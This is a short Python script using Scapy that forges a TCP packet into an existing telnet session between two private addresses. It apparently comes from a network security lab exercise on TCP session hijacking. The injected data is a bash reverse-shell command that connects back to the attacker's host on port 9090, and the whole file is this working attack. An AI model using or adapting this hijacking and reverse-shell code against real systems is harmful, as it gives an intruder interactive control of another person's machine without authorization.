#!/usr/bin/env python3
from scapy.all import *
ip  = IP(src="10.9.0.1", dst="10.9.0.5")
tcp = TCP(sport=45184, dport=23, flags="PA", seq=278493352, ack=2193314869)
data = "/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1\r"
pkt = ip/tcp/data
ls(pkt)
send(pkt,verbose=0)
